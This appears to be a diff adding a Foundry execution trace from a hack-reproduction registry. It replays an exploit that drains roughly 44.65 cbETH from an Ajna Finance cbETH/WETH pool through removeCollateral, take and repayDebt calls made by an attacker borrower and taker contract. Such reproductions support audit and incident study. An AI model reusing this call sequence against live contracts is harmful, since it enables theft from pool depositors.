+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000014eff82f6c380e9d000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002ff3ee9539482b50000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000286fa8f5cdc9ee576000000000000000000000000000000000000000000000002dd40ba93442c981b000000000000000000000000000000000000000000000002dd40b23888eddba3000000000000000000000000000000000000000000000000000000173eb4c80a000000000000000000000000000000000000000000000002acc826289035713a0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002ad0a74e60dbdd87b00000000000000000000000000000000000000000000000030363d52b6d092910000000000000000000000000000000000000000000000029bea878c48d6f41300000000000000000000000000000000000000000000000286fa8f5cdc9ee576
+    │   │   │   ├─ [48682] PoolCommons::updateInterestState() [delegatecall]
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 16397: 0x000000000000000000000000000000000000000000000002a6877169b3bab471 → 0x00000000000000000000000000000000000000000000000280331821bdec35cc
+    │   │   │   │   │   @ 16400: 0x000000000000000000000000000000000000000000000000000000006a91a6cb → 0x000000000000000000000000000000000000000000000000000000006a91b4f3
+    │   │   │   │   │   @ 16399: 0x00000000000000000000000000000000000000000000000000045578cf337b58 → 0x00000000000000000000000000000000000000000000000000044c4b41254627
+    │   │   │   │   │   @ 16398: 0x000000000000000000000000000000000000000000000000000454545a3f0d0d → 0x00000000000000000000000000000000000000000000000000044b293788996d
+    │   │   │   │   │   @ 16396: 0x000000000000000000000000000000000000000000000000000248a775cffee4 → 0x000000000000000000000000000000000000000000000000000227a0a7fc9557
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 16395: 0x00006a91a6cb0000000000000000000000000000000000000de0b6b3a7640000 → 0x00006a91b4f30000000000000000000000000000000000000de0b6dc21d9351f
+    │   │   │   │   @ 16414: 0x000000000000000000000000000000000000000000000000342eb0eb2bfa70ca → 0x000000000000000000000000000000000000000000000000342ebe2ff5684e77
+    │   │   │   │   @ 16409: 0x0000000000000000000000000000000000000000000000055a14e9cbdfdb218d → 0x000000000000000000000000000000000000000000000002dd40b23888eddba3
+    │   │   │   │   @ 16407: 0x000000000000000000000000000000000000000000000002a5090689e8c170b6 → 0x00000000000000000000000000000000000000000000000290190e5a7c896219
+    │   │   │   │   @ 16408: 0x0000000000000000000000000000000000000000000000055a14e9cbdfdb218d → 0x000000000000000000000000000000000000000000000002dd40b23888eddba3
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return]
+    │   ├─ [114840] AjnaCbethPool::removeCollateral(115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77], 2000)
+    │   │   ├─ [114622] 0x05bB4F6362B02F17C1A3F2B047A8b23368269A21::6a9b1891(ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000007d0009a96ec9b57fb64fbc60b423d1f4da7691bd35079be9895146f7af43049ca1c1ae358b0541ea49704c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001007d) [delegatecall]
+    │   │   │   ├─ [18348] LenderActions::80f2fcd0(000000000000000000000000000000000000000000000000000000000000402000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000001ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000007d0) [delegatecall]
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xfa5d264ad3e5c407de145c467d6de758622d83f513c04645c52b13de4f22c71c: 0x00000000000000000000000000000000000000000000000014eff82f6c380e9d → 0x0000000000000000000000000000000000000000000000000003bf684ef7ef9e
+    │   │   │   │   │   @ 0x81c161efc741236499d312f3ecea8f5e3be942ded674813fb300d78b3238d9c2: 0x000000000000000000000000000000000000000000000eef07aceb1fd6a5e2be → 0
+    │   │   │   │   │   @ 0xfa5d264ad3e5c407de145c467d6de758622d83f513c04645c52b13de4f22c71b: 0x000000000000000000000000000000000000000000000ef1b47512735dbb4f66 → 0x000000000000000000000000000000000000000000000002acc8275387156ca8
+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000014ec38c71d401eff000000000000000000000000000000000000000000000eef07aceb1fd6a5e2be
+    │   │   │   ├─ emit RemoveCollateral(claimer: AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], index: 2000, amount: 1507642403102662399 [1.507e18], lpRedeemed: 70522455669167853265598 [7.052e22])
+    │   │   │   ├─ [4816] PoolCommons::updateInterestState() [delegatecall]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [43883] cbETH::transfer(AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1507642403102662399 [1.507e18])
+    │   │   │   │   ├─ [36683] 0x31724cA0C982A31fbb5C57f4217AB585271fc9a5::transfer(AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1507642403102662399 [1.507e18]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: AjnaCbethPool: [0xad24FC773e125Edb223C38a39657cB64bc7C178e], to: AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 1507642403102662399 [1.507e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xd5a3747ee31d3fd63e41cb739b082a09bdc30756b64987e2144484efdf2892c3: 0 → 0x00000000000000000000000000000000000000000000000014ec38c71d401eff
+    │   │   │   │   │   │   @ 0x839d1e82504a1e185da10065ed72fffde7fd0b359a8a8b4a21740b0e288f4221: 0x000000000000000000000000000000000000000000000002a5090689e8c170b6 → 0x000000000000000000000000000000000000000000000002901ccdc2cb8151b7
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000014ec38c71d401eff000000000000000000000000000000000000000000000eef07aceb1fd6a5e2be
+    │   │   └─ ← [Return] 1507642403102662399 [1.507e18], 70522455669167853265598 [7.052e22]
+    │   └─ ← [Stop]
+    ├─ [110588] AjnaTaker::settleLeg(AttackerBorrower: [0x02D329Ebb1DA079A89988366b777aF300DB96F5f])
+    │   ├─ [109193] AjnaCbethPool::take(AttackerBorrower: [0x02D329Ebb1DA079A89988366b777aF300DB96F5f], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77], AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
+    │   │   ├─ [108963] 0x05bB4F6362B02F17C1A3F2B047A8b23368269A21::66ae5880(00000000000000000000000002d329ebb1da079a89988366b777af300db96f5fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000009a96ec9b57fb64fbc60b423d1f4da7691bd35079be9895146f7af43049ca1c1ae358b0541ea49704c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001007d) [delegatecall]
+    │   │   │   ├─ [76826] TakerActions::0f4a0c2d(00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000004020000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000040080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002dd40b23888eddba3000000000000000000000000000000000000000000000002dd40b23888eddba3000000000000000000000000000000000000000000000002dd40ba93442c981b00000000000000000000000000000000000000000000000290190e5a7c8962190000000000000000000000000000000000000000000000000de0b6dc21d9351f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055ff20b0ce564000000000000000000000000000000000000000000000000000000000000000100000000000000000000000002d329ebb1da079a89988366b777af300db96f5fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000000001) [delegatecall]
+    │   │   │   │   ├─ emit Take(borrower: AttackerBorrower: [0x02D329Ebb1DA079A89988366b777aF300DB96F5f], amount: 3474032191998137190 [3.474e18], collateral: 106219409879431296 [1.062e17], bondChange: 0, isReward: false)
+    │   │   │   │   ├─ emit AuctionSettle(borrower: AttackerBorrower: [0x02D329Ebb1DA079A89988366b777aF300DB96F5f], collateral: 46513512711800843510 [4.651e19])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1bfbbc29e3d6d623e3195ceed7ce46062e86d1b06b874d8a86c077a209b4b0ba: 1 → 0
+    │   │   │   │   │   @ 0x1bfbbc29e3d6d623e3195ceed7ce46062e86d1b06b874d8a86c077a209b4b0b6: 0x00000000002386f26fc1000080ad419c4783a09252ad6a576ce059f51cc53d47 → 0
+    │   │   │   │   │   @ 0x14ce8d6cea3040c3c69fa831c15bf3fcd00677d9b2115453710b9ea940d14617: 0x00000000000000000000000000000000000000000000000286fa8f5cdc9ee576 → 0x0000000000000000000000000000000000000000000000028581315f4a816cf6
+    │   │   │   │   │   @ 0x14ce8d6cea3040c3c69fa831c15bf3fcd00677d9b2115453710b9ea940d14616: 0x00000000000000000000000000000000000000000000000030363d52b6d09291 → 0
+    │   │   │   │   │   @ 0x1bfbbc29e3d6d623e3195ceed7ce46062e86d1b06b874d8a86c077a209b4b0b7: 0x80ad419c4783a09252ad6a576ce059f51cc53d4700000000000000006a91a6cb → 0
+    │   │   │   │   │   @ 2: 0x00000000000000000000000002d329ebb1da079a89988366b777af300db96f5f → 0x00000000000000000000000080ad419c4783a09252ad6a576ce059f51cc53d47
+    │   │   │   │   │   @ 0x1bfbbc29e3d6d623e3195ceed7ce46062e86d1b06b874d8a86c077a209b4b0b9: 0x000000000e3fef45c4d7c9020000000000000000000000000000000000000000 → 0
+    │   │   │   │   │   @ 0xa9abf4530ecb78becd50d91632481fe15fc1bc416f77f555eab05f415315ef9c: 0x02d329ebb1da079a89988366b777af300db96f5f000000000e3a6c952c39da1e → 0x0000000000000000000000000000000000000000000000000e3a6c952c39da1e
+    │   │   │   │   │   @ 0x1bfbbc29e3d6d623e3195ceed7ce46062e86d1b06b874d8a86c077a209b4b0b8: 0x0000000000000000000000000000000000000000000000000e3a6c952c39da1e → 0
+    │   │   │   │   │   @ 0x14ce8d6cea3040c3c69fa831c15bf3fcd00677d9b2115453710b9ea940d14618: 0x0000000000000000000000000000000000000000000000000e3fef45c4d7c902 → 0
+    │   │   │   │   │   @ 1: 0x80ad419c4783a09252ad6a576ce059f51cc53d47000000000000000000000002 → 0x80ad419c4783a09252ad6a576ce059f51cc53d47000000000000000000000001
+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000001795dfd921d7880000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030363ddf56521366000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000028581315f4a816cf6000000000000000000000000000000000000000000000002ad0a7cb3edda84b5000000000000000000000000000000000000000000000002ad0a74e5d21d4912000000000000000000000000000000000000000000000000000000173eb4c80a00000000000000000000000000000000000000000000000030363d52b6d09291000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000030363d52b6d09291000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000286fa8f5cdc9ee5760000000000000000000000000000000000000000000000028581315f4a816cf6
+    │   │   │   ├─ [4816] PoolCommons::updateInterestState() [delegatecall]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [4683] cbETH::transfer(AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 106219409879431296 [1.062e17])
+    │   │   │   │   ├─ [3983] 0x31724cA0C982A31fbb5C57f4217AB585271fc9a5::transfer(AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 106219409879431296 [1.062e17]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: AjnaCbethPool: [0xad24FC773e125Edb223C38a39657cB64bc7C178e], to: AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 106219409879431296 [1.062e17])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xd5a3747ee31d3fd63e41cb739b082a09bdc30756b64987e2144484efdf2892c3: 0x00000000000000000000000000000000000000000000000014ec38c71d401eff → 0x000000000000000000000000000000000000000000000000166596c4af5d977f
+    │   │   │   │   │   │   @ 0x839d1e82504a1e185da10065ed72fffde7fd0b359a8a8b4a21740b0e288f4221: 0x000000000000000000000000000000000000000000000002901ccdc2cb8151b7 → 0x0000000000000000000000000000000000000000000000028ea36fc53963d937
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [8225] WETH::transferFrom(AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], AjnaCbethPool: [0xad24FC773e125Edb223C38a39657cB64bc7C178e], 3474032191998137190 [3.474e18])
+    │   │   │   │   ├─ emit Transfer(from: AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: AjnaCbethPool: [0xad24FC773e125Edb223C38a39657cB64bc7C178e], amount: 3474032191998137190 [3.474e18])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x0000000000000000000000000000000000000000000000056bc75e2d63100000 → 0x0000000000000000000000000000000000000000000000053b91204e0cbdec9a
+    │   │   │   │   │   @ 0x8a2a6301bf0cb4785f48d1f386aada0fcf374c0366f6c696d0af8fc6f04ac7c6: 0x0000000000000000000000000000000000000000000000000e624fb500731c46 → 0x0000000000000000000000000000000000000000000000003e988d9456c52fac
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 16407: 0x00000000000000000000000000000000000000000000000290190e5a7c896219 → 0x0000000000000000000000000000000000000000000000028e9fb05cea6be999
+    │   │   │   │   @ 16409: 0x000000000000000000000000000000000000000000000002dd40b23888eddba3 → 0x000000000000000000000000000000000000000000000002ad0a74e5d21d4912
+    │   │   │   │   @ 16408: 0x000000000000000000000000000000000000000000000002dd40b23888eddba3 → 0x000000000000000000000000000000000000000000000002ad0a74e5d21d4912
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return]
+    │   └─ ← [Stop]
+    ├─ [2007] AjnaCbethPool::borrowerInfo(AttackerBorrower: [0x02D329Ebb1DA079A89988366b777aF300DB96F5f]) [staticcall]
+    │   ├─ [1792] 0x05bB4F6362B02F17C1A3F2B047A8b23368269A21::ca103d15(00000000000000000000000002d329ebb1da079a89988366b777af300db96f5f009a96ec9b57fb64fbc60b423d1f4da7691bd35079be9895146f7af43049ca1c1ae358b0541ea49704c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001007d) [delegatecall]
+    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000028581315f4a816cf60000000000000000000000000000000000000000000000000000000000000000
+    │   └─ ← [Return] 0, 46513512711800843510 [4.651e19], 0
+    ├─ [1791] AjnaCbethPool::auctionInfo(AttackerBorrower: [0x02D329Ebb1DA079A89988366b777aF300DB96F5f]) [staticcall]
+    │   ├─ [1543] 0x05bB4F6362B02F17C1A3F2B047A8b23368269A21::0448e51a(00000000000000000000000002d329ebb1da079a89988366b777af300db96f5f009a96ec9b57fb64fbc60b423d1f4da7691bd35079be9895146f7af43049ca1c1ae358b0541ea49704c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001007d) [delegatecall]
+    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080ad419c4783a09252ad6a576ce059f51cc53d47000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000, 0, 0, 0, 0, 0, 0x80AD419C4783A09252Ad6a576ce059f51Cc53D47, 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, false
+    ├─ [0] VM::assertEq(0, 0, "auction not settled before pulling collateral") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(AttackerBorrower: [0x02D329Ebb1DA079A89988366b777aF300DB96F5f])
+    │   └─ ← [Return]
+    ├─ [62919] AjnaCbethPool::repayDebt(AttackerBorrower: [0x02D329Ebb1DA079A89988366b777aF300DB96F5f], 0, 46513512711800843510 [4.651e19], AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 7388)
+    │   ├─ [62689] 0x05bB4F6362B02F17C1A3F2B047A8b23368269A21::a9ff9f77(00000000000000000000000002d329ebb1da079a89988366b777af300db96f5f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000028581315f4a816cf60000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000000000001cdc009a96ec9b57fb64fbc60b423d1f4da7691bd35079be9895146f7af43049ca1c1ae358b0541ea49704c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001007d) [delegatecall]
+    │   │   ├─ [36785] BorrowerActions::9883470d(00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000004020000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000040080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002ad0a74e5d21d4912000000000000000000000000000000000000000000000002ad0a74e5d21d4912000000000000000000000000000000000000000000000002ad0a7cb3edda84b50000000000000000000000000000000000000000000000028e9fb05cea6be9990000000000000000000000000000000000000000000000000de0b6dc21d9351f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055ff20b0ce564000000000000000000000000000000000000000000000000000000000000000100000000000000000000000002d329ebb1da079a89988366b777af300db96f5f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000028581315f4a816cf60000000000000000000000000000000000000000000000000000000000001cdc) [delegatecall]
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x14ce8d6cea3040c3c69fa831c15bf3fcd00677d9b2115453710b9ea940d14617: 0x0000000000000000000000000000000000000000000000028581315f4a816cf6 → 0
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000173eb4c80a000000000000000000000000000000000000000000000000091e7efd9fea7ca3000000000000000000000000000000000000000000000002ad0a7cb3edda84b50000000000000000000000000000000000000000000000028581315f4a816cf600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002ad0a74e5d21d49120000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000028581315f4a816cf60000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ emit RepayDebt(borrower: AttackerBorrower: [0x02D329Ebb1DA079A89988366b777aF300DB96F5f], quoteRepaid: 0, collateralPulled: 46513512711800843510 [4.651e19], lup: 99836282890 [9.983e10])
+    │   │   ├─ [4816] PoolCommons::updateInterestState() [delegatecall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [4683] cbETH::transfer(AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 46513512711800843510 [4.651e19])
+    │   │   │   ├─ [3983] 0x31724cA0C982A31fbb5C57f4217AB585271fc9a5::transfer(AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 46513512711800843510 [4.651e19]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: AjnaCbethPool: [0xad24FC773e125Edb223C38a39657cB64bc7C178e], to: AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 46513512711800843510 [4.651e19])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x839d1e82504a1e185da10065ed72fffde7fd0b359a8a8b4a21740b0e288f4221: 0x0000000000000000000000000000000000000000000000028ea36fc53963d937 → 0x00000000000000000000000000000000000000000000000009223e65eee26c41
+    │   │   │   │   │   @ 0xd5a3747ee31d3fd63e41cb739b082a09bdc30756b64987e2144484efdf2892c3: 0x000000000000000000000000000000000000000000000000166596c4af5d977f → 0x0000000000000000000000000000000000000000000000029be6c823f9df0475
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  storage changes:
+    │   │   │   @ 16407: 0x0000000000000000000000000000000000000000000000028e9fb05cea6be999 → 0x000000000000000000000000000000000000000000000000091e7efd9fea7ca3
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [1226] cbETH::balanceOf(AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   ├─ [529] 0x31724cA0C982A31fbb5C57f4217AB585271fc9a5::balanceOf(AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   └─ ← [Return] 48127374524782937205 [4.812e19]
+    │   └─ ← [Return] 48127374524782937205 [4.812e19]
+    ├─ [534] WETH::balanceOf(AjnaTaker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 96525967808001862810 [9.652e19]
+    ├─ emit log_named_decimal_uint(key: "taker cbETH gained", val: 48127374524782937205 [4.812e19], decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "taker WETH spent", val: 3474032191998137190 [3.474e18], decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "net ETH-equivalent drained", val: 44653342332784800015 [4.465e19], decimals: 18)
+    ├─ [0] VM::assertGe(48127374524782937205 [4.812e19], 43750000000000000000 [4.375e19], "expected >= the reported ~43.75 cbETH collateral seized") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertApproxEqAbs(44653342332784800015 [4.465e19], 44650000000000000000 [4.465e19], 2000000000000000000 [2e18], "net drain off the reported ~$124.8K") [staticcall]
+    │   └─ ← [Return]
+    ├─  storage changes:
+    │   @ 0xe7cca40de8bb426a7dca2985055977f4996ef67c8b8775d0bb5e589c427917d1: 0 → 1
+    │   @ 0xe7cca40de8bb426a7dca2985055977f4996ef67c8b8775d0bb5e589c427917ce: 0 → 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.44s (46.20ms CPU time)
+
+Ran 1 test suite in 16.18s (5.44s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+/workspaces/RustroverProjects/audits/evm-hack-registry/_shared/run-poc/run_poc.sh: line 71: 19584 Killed                  nice -n 10 anvil --load-state "$TMPROOT/anvil_state.json" --port 0 --chain-id "$CHAINID" > "$ANVIL_LOG" 2>&1  (wd: /workspaces/RustroverProjects/audits/evm-hack-registry/2026-08-AjnaFinance_exp)
